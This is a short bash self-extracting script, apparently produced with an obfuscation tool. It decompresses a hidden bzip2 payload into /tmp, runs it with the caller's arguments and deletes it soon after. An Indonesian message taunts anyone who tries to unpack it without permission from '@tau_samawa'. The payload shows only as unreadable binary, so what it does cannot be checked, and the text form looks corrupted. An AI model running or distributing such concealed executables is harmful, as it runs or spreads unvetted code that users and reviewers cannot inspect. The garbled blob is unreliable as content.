#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYb��  �_� }������~����PoR�	D�)���M4P�FM4��d�� ����&������F�FL�a �s	�#CC!�hd4Ѡ� @0�h����a4h �d�I	��ah)<"<�4��z��l�z� l=�`1�t�׍�~��z���lmy���.�xH��������P_����t ���WkV��(6��F<�T�5^-|E��3���J�9 �V��/��:'�u�+�80m�����1� ��2H�A�-Gқ�|��8\��O�Q�f��/�r��9"	E=. �P�
[���t��"`�H5���mF��g���#B;��x+*C�u���3�h&�a'�A����5���I�yI��kϘ���0p,��
�YNܺ�+��#�dn Q��|�}�w���0Z��W�I������w"���"t�SЎ�H�y���H�-�?QE���CT���^�_+�蟭FA�|�^xf ��74���y�i/a��E�r�!U!F�z�<�Ey��
-K� �V3[��Nx����s>yrz���Qu!�~�*hЊ�LbM����u���`�"�l3���;�� vM*#�Bɉ�I�!yϐ)��ofm�[��	1W��o�C��*������v��M�a��r/!�m1�H�i��ѥ��h9�n�!U�����xU�p�y�S��pp�A��mV4԰;�vsĞaL	��CΌ�无��\�i���j��V�&0�)O=�u��g�@4� �,���S'�ZݵQ8�ե�k��X�s�Gα�,��@����<�E�X�N)��U�e�F�`n�j8�N)*��l��*��B��c�Q�b:�����ô=�h�?�!����PZ*J1�-�_�w$S�	v)	�